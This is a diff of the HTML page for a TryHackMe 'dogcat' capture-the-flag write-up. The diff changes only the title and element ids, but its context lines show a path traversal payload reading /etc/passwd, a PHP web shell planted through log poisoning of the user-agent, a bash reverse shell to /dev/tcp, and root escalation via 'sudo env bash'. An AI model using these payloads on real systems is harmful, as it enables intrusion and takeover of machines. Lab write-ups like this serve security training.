@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>[THM] dogcat writeup</title>
+<title>THM: Dogcat</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
 <link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
@@ -14,7 +14,7 @@
  |
  <a accesskey="H" href="/index.html"> HOME </a>
 </div><div id="content" class="content">
-<h1 class="title">[THM] dogcat writeup</h1>
+<h1 class="title">THM: Dogcat</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
@@ -52,7 +52,7 @@ First I decided to use <code>masscan</code> on all of the machine ports to limit
 I would then run more elaborate scans. However, since that scan did not wield
 any results, I went back to good old <code>nmap</code>.
 </p>
-<div class="code" id="orgcf712f5">
+<div class="code" id="org9aac631">
 <p>
 sudo nmap -Pn &lt;MACHINE<sub>IP</sub>&gt;
 </p>
@@ -69,7 +69,7 @@ start; two ports were open:
 <p>
 After that I ran
 </p>
-<div class="code" id="orgda9d02a">
+<div class="code" id="orgc636aa2">
 <p>
 sudo nmap -A -p22,80 &lt;MACHINE<sub>IP</sub>&gt;
 </p>
@@ -130,7 +130,7 @@ After a little bit of toying around with that, realising that the string passed
 needs to contain either <i>dog</i> or <i>cat</i> in order to be executed by the php
 back-end, we try to see what files we can access:
 </p>
-<div class="code" id="orgff225b3">
+<div class="code" id="orged6e66e">
 <p>
 ?view=../../../../../etc/passwd%00dog
 </p>
@@ -168,7 +168,7 @@ Getting back the code for <i>dog.php</i> encoded in base64.
 To decode it, avoiding online tools one can simply use
 </p>
 
-<div class="code" id="org20fb2b5">
+<div class="code" id="orgea08c55">
 <p>
 echo &rsquo;&lt;paste encoded code here&gt;&rsquo; &gt; dog.b64
 base64 -d dog.b64 &gt; dog.php
@@ -190,7 +190,7 @@ our requests can be changed using the <code>?ext=</code> parameter!
 <p>
 Going back to previous requests we can finally see /etc/passwd!!
 </p>
-<div class="code" id="org2fc283c">
+<div class="code" id="org5e4a42a">
 <p>
 ?view=dog/../../../../../etc/passwd&amp;ext=
 </p>
@@ -233,7 +233,7 @@ Yup, it worked.
 <p>
 Either through <code>curl</code>, <code>burpsuite</code> or <code>zap</code> we set the user-agent to
 </p>
-<div class="code" id="org1cfff97">
+<div class="code" id="org462077a">
 <p>
 &lt;?php system($<sub>GET</sub>[&rsquo;cmd&rsquo;]) ?&gt;
 </p>
@@ -258,7 +258,7 @@ on the cmd parameter
 <p>
 I went with this one ( after checking with <code>whereis bash</code> )
 </p>
-<div class="code" id="org28812aa">
+<div class="code" id="org763d180">
 <p>
 bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/&lt;MYIP&gt;/&lt;MYPORT&gt; 0&gt;&amp;1&rdquo;
 </p>
@@ -285,7 +285,7 @@ Naturally the first step was to check for sudo privileges <code>sudo -l</code>
 It lets us run <code>env</code> without a password, which means, pretty much that we can do
 anything we want as root on the machine.
 </p>
-<div class="code" id="org868fc44">
+<div class="code" id="orga519f3e">
 <p>
 sudo env bash
 </p>
